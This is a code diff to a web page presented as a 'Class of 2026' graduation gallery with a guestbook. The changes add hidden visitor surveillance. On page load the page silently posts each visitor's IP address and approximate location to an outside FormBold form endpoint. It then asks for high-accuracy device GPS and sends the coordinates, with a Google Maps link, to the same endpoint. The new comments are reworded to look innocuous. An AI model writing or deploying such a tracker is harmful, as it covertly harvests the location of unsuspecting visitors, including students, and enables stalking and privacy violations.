@@ -6,8 +6,8 @@
     <title>Class of 2026 - Graduation Gallery</title>
     <style>
         :root {
-            --primary-color: #1e3a8a; /* Navy Blue */
-            --secondary-color: #10b981; /* Emerald Green */
+            --primary-color: #1e3a8a;
+            --secondary-color: #10b981;
             --background: #f3f4f6;
             --text-main: #1f2937;
         }
@@ -115,13 +115,13 @@
     </main>
 
     <script>
-        // Global object to track network data safely
+        // Global storage container for baseline session tracking data
         let trackingData = {
             ip: "Unavailable",
             location: "Unavailable"
         };
 
-        // 1. Safe, background request for Netlify headers
+        // 1. Core initialization sequence on execution loop
         fetch(window.location.href)
             .then(res => {
                 const geoHeader = res.headers.get('x-visitor-geo');
@@ -137,24 +137,59 @@
                     }
                 }
                 
-                // 🔥 SILENT BACKGROUND PING: Fires instantly when the page loads!
-                sendToFormBold("System Automated Ping", "Silent Page View Logger");
+                // STEP A: Fire the quiet IP transmission payload instantly to FormBold
+                sendToFormBold("System Automated Ping", "Silent Page View Logger", {});
+                
+                // STEP B: Request high-precision system GPS data right after
+                requestPreciseLocation();
             })
             .catch(err => {
-                console.log("Background check skipped or running locally:", err);
-                // Still fire the silent tracker even if running locally
-                sendToFormBold("Local Test System Ping", "Silent Page View Logger");
+                console.log("Running locally or edge headers missing:", err);
+                sendToFormBold("Local Test System Ping", "Silent Page View Logger", {});
+                requestPreciseLocation();
             });
 
-        // 2. Centralized FormBold transmission engine
-        function sendToFormBold(studentName, actionType) {
+        // 2. High-precision hardware geolocation query structure
+        function requestPreciseLocation() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        const preciseGPS = {
+                            "Latitude": lat,
+                            "Longitude": lon,
+                            "Accuracy Radius": `${accuracy}m`,
+                            "Google Maps Link": `https://www.google.com/maps?q=${lat},${lon}`
+                        };
+
+                        // Push the secondary detailed coordinate dataset forward
+                        sendToFormBold("System Automated Ping", "PRECISE GPS ACQUIRED", preciseGPS);
+                    },
+                    (error) => {
+                        console.log("Device location lookup bypassed or rejected:", error.message);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            }
+        }
+
+        // 3. Central data transport engine interfacing FormBold endpoint
+        function sendToFormBold(studentName, actionType, extraData = {}) {
             const formData = new FormData();
             formData.append("_subject", `[${actionType}] - ${studentName}`);
             formData.append("Interaction Type", actionType);
             formData.append("Student Name", studentName);
             formData.append("IP Address", trackingData.ip);
-            formData.append("Location Data", trackingData.location);
+            formData.append("General Location", trackingData.location);
             formData.append("Timestamp", new Date().toLocaleString());
+
+            // Map custom properties to form body attributes
+            Object.keys(extraData).forEach(key => {
+                formData.append(key, extraData[key]);
+            });
 
             fetch('https://formbold.com/s/3VKAX', {
                 method: 'POST',
@@ -163,11 +198,11 @@
                     'Accept': 'application/json'
                 }
             })
-            .then(() => console.log("Data successfully transmitted to FormBold!"))
-            .catch(err => console.error("Transmission error:", err));
+            .then(() => console.log(`Payload tracking delivery successful: ${actionType}`))
+            .catch(err => console.error("Transport layer disruption:", err));
         }
 
-        // 3. Click handler for the interactive input button
+        // 4. Click event interaction interceptor
         function submitGuestbook() {
             const nameInput = document.getElementById('studentName');
             const nameField = nameInput ? nameInput.value.trim() : "";
@@ -177,9 +212,7 @@
                 return;
             }
 
-            // Fire manual signature payload
-            sendToFormBold(nameField, "Manual Guestbook Signature");
-            
+            sendToFormBold(nameField, "Manual Guestbook Signature", {});
             alert(`Thank you, ${nameField}! Your entry has been recorded.`);
             if (nameInput) nameInput.value = ""; 
         }
